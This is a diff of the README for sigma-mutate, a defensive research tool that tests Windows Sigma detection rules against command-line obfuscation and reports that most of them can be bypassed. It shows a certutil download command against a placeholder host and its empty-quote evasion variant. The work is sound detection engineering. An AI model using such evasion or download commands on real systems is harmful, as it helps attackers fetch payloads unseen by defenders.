@@ -1,66 +1,80 @@
 # sigma-mutate
 
-**Do the rules that detect cyberattacks still work when an attacker types the same command a
-little differently?** For most public Windows detection rules, the answer is no. This project
-measures it, rule by rule.
+**A crash test for cyberattack detection rules.** It checks whether a rule that spots an attack
+still spots it when the attacker types the same command slightly differently. Tested on 1,193
+public rules: **97% of them can be sidestepped this way.**
 
 ## The problem
 
-Companies spot attacks on their computers with *detection rules*: small descriptions of
-suspicious activity, such as "someone used the built-in tool `certutil` to download a file from
-the internet". When a rule matches, the security team gets an alert.
+To catch hackers, companies use *detection rules*. A rule says something like: "if someone uses
+this Windows tool to download a file from the internet, raise an alert". Most rules work by
+looking for specific words in the command the attacker typed.
 
-Most of these rules work by looking for specific words in the command that was run. But Windows
-accepts many spellings of the same command. These two lines do exactly the same thing:
+The catch: Windows accepts many spellings of the same command. Adding two quote marks in the
+middle of a word, for example, changes nothing for Windows, which removes them before running
+the command:
 
 ```
-certutil.exe -urlcache -f http://example.com/file.exe
-certutil.exe -url""cache -f ht""tp://example.com/file.exe
+certutil -urlcache http://...         ← the rule sees "urlcache": alert
+certutil -url""cache http://...       ← same action, the rule sees nothing
 ```
 
-Windows quietly removes the empty quotes `""` before running the command. A rule that looks for
-the word `urlcache` sees the first line and raises an alert. It does not see the second one.
-The attack runs the same way, without an alert.
+The attack runs exactly the same way, but no alert is raised.
 
 ## Why it matters
 
-[Sigma](https://github.com/SigmaHQ/sigma) is the open, shared format for these rules. Its public
-library holds thousands of rules written by the security community and is reused by companies
-and security products around the world. If a rule can be bypassed by adding two quote
-characters, the people relying on it are less protected than they think, and an attacker needs
-no skill to get around it.
+These rules are not obscure. They come from [Sigma](https://github.com/SigmaHQ/sigma), the open
+format the security community uses to share detection rules. Its public library is reused by
+companies and security products around the world. A rule that two quote marks can defeat gives
+a false sense of safety, and an attacker needs no skill at all to get past it.
 
-## What this project shows
+## What the project proves
 
-sigma-mutate took every Windows rule of the public library that watches programs being started
-(1,193 rules), built for each one a command it detects, rewrote that command in ways that do not
-change what it does, and checked whether the rule still fired.
+The tool tested every Windows rule of that library that watches programs being launched
+(1,193 rules). For each one it built a command the rule catches, rewrote it in ways that change
+nothing for Windows, and checked whether the rule still fired.
 
-- **894 rules** could be tested automatically.
-- **97%** of those that gave a clear answer (834 of 864) **missed at least one rewritten command**.
-- With the strictest counting (only rules that have no other way to raise an alert, and only
-  programs whose behaviour was checked on a real Windows machine), the figure is still **91%**
-  (173 of 191).
-- The rewritten commands were really run on Windows with 15 common programs: every rewrite the
-  tool uses by default (193 of 193) gave exactly the same result as the original.
-- The tool's verdicts were double-checked by an independent rule engine on 22,002 test events,
-  with **no disagreement**.
+| | |
+|---|---|
+| Rules that could be tested | **894** |
+| Rules that miss at least one rewritten command | **97%** (834 of 864 with a clear answer) |
+| Same, counting only the most certain cases | **91%** (173 of 191) |
 
-Full figures and examples are in [RESULTS.md](RESULTS.md). The method and its limits are in
-[METHODOLOGY.md](METHODOLOGY.md).
+In plain words: for almost every rule, an attacker can avoid the alert by adding quotes or
+spaces to the command. The 91% figure keeps only rules that have no other way to raise an alert
+and programs whose behaviour was checked on a real Windows computer. It is the most cautious
+reading, and the conclusion holds.
 
-**What it does not show:** that these attacks go unnoticed everywhere. Companies usually have
-other defences too. It shows that a large share of individual rules can be sidestepped with
-trivial changes, which is a measurable, fixable weakness.
+This does not mean attacks go unnoticed everywhere: companies usually have several layers of
+defence. It means one widely shared layer has a measurable weakness, and that weakness can be
+fixed.
 
-## How it works
+## Why the results can be trusted
 
-1. **Build a test command** from each rule, since the public rules come without examples.
-2. **Rewrite it** without changing what it does: empty quotes inside a word, quotes around a
-   word, extra spaces, tabs.
-3. **Check** whether the rule still detects each rewritten command.
-4. **Verify the verifier**: the rewrites are run on a real Windows machine to prove they are
-   equivalent, and an independent engine replays every test.
+A claim like "97% of rules fail" is only worth something if the measurement is right. The
+project checks itself at every step:
+
+- **The rewritten commands really are equivalent.** They were actually run on a Windows computer
+  with 15 common programs. All 193 rewrites the tool uses by default gave exactly the same result
+  as the original. The few rewrites that only work with some programs were found this way and
+  are left out.
+- **The verdicts are double-checked.** The project includes its own engine that reads and applies
+  the rules. Its 22,002 verdicts were compared with those of an independent, existing engine
+  (rsigma): no disagreement.
+- **Nothing is hand-picked.** The library has no sample attacks, so the tool builds a test case
+  automatically for each rule, including rules written as complex text patterns. Every number can
+  be regenerated with three commands, and automated tests run on every change.
+
+## Who it is for
+
+Teams that write or deploy detection rules can run sigma-mutate on their rules before putting
+them in production. It shows exactly which rewritten commands slip through, so the rule can be
+fixed, in the same way that software tests catch bugs before release.
+
+## Learn more
+
+- [RESULTS.md](RESULTS.md): all the figures, with real examples of rules and the commands they miss.
+- [METHODOLOGY.md](METHODOLOGY.md): how it works in detail, what is supported and the limits.
 
 ## Try it
 
@@ -72,13 +86,13 @@ pip install -e .
 # one rule, one event
 sigma-mutate examples/certutil_rule.yml examples/certutil_event.json
 
-# a whole folder of SigmaHQ rules, then the report
+# a whole folder of Sigma rules, then the report
 python scripts/corpus.py path/to/sigma/rules/windows/process_creation --verify-rsigma
 python scripts/report.py
 ```
 
 `--verify-rsigma` needs [rsigma](https://github.com/timescale/rsigma) on the PATH.
-`scripts/validate_mutators.py` reruns the Windows validation (Windows only, harmless read-only
+`scripts/validate_mutators.py` reruns the Windows check (Windows only, harmless read-only
 commands).
 
 ## License
